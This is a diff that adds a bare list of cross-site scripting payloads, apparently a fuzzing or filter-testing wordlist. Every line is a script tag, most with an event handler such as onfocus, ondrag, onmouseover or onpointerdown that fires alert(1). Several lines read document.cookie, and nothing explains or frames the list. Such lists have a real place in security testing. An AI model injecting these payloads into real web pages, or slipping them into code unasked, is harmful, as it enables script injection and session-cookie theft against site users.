@@ -1,0 +1,43 @@
+<script>prompt(5000/200)</script>
+<script>alert(6000/3000)</script>
+<script>alert(document.cookie)</script>
+<script>prompt(document.cookie)</script>
+<script>console.log(5000/3000)</script>
+<script contenteditable onbeforeinput=alert(1)>test
+<script draggable="true" ondrag="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragend="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragenter="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragleave="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragstart="alert(1)" style=display:block>test</script>
+<script id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></script>
+<script id=x tabindex=1 onfocus=alert(1)></script>
+<script id=x tabindex=1 onfocusin=alert(1)></script>
+<script onafterscriptexecute=alert(1)><script>1</script>
+<script onbeforescriptexecute=alert(1)><script>1</script>
+<script onblur=alert(1) id=x tabindex=1 style=display:block>test</script><input value=clickme>
+<script onclick="alert(1)" style=display:block>test</script>
+<script oncontextmenu="alert(1)" style=display:block>test</script>
+<script oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<script oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<script ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</script>
+<script onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</script><input value=clickme>
+<script onkeydown="alert(1)" contenteditable style=display:block>test</script>
+<script onkeypress="alert(1)" contenteditable style=display:block>test</script>
+<script onkeyup="alert(1)" contenteditable style=display:block>test</script>
+<script onmousedown="alert(1)" style=display:block>test</script>
+<script onmouseenter="alert(1)" style=display:block>test</script>
+<script onmouseleave="alert(1)" style=display:block>test</script>
+<script onmousemove="alert(1)" style=display:block>test</script>
+<script onmouseout="alert(1)" style=display:block>test</script>
+<script onmouseover="alert(1)" style=display:block>test</script>
+<script onmouseup="alert(1)" style=display:block>test</script>
+<script onmousewheel=alert(1) style=display:block>requires scrolling
+<script onpointerdown=alert(1) style=display:block>XSS</script>
+<script onpointerenter=alert(1) style=display:block>XSS</script>
+<script onpointerleave=alert(1) style=display:block>XSS</script>
+<script onpointermove=alert(1) style=display:block>XSS</script>
+<script onpointerout=alert(1) style=display:block>XSS</script>
+<script onpointerover=alert(1) style=display:block>XSS</script>
+<script onpointerrawupdate=alert(1) style=display:block>XSS</script>
+<script onpointerup=alert(1) style=display:block>XSS</script>
+<script onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></script>
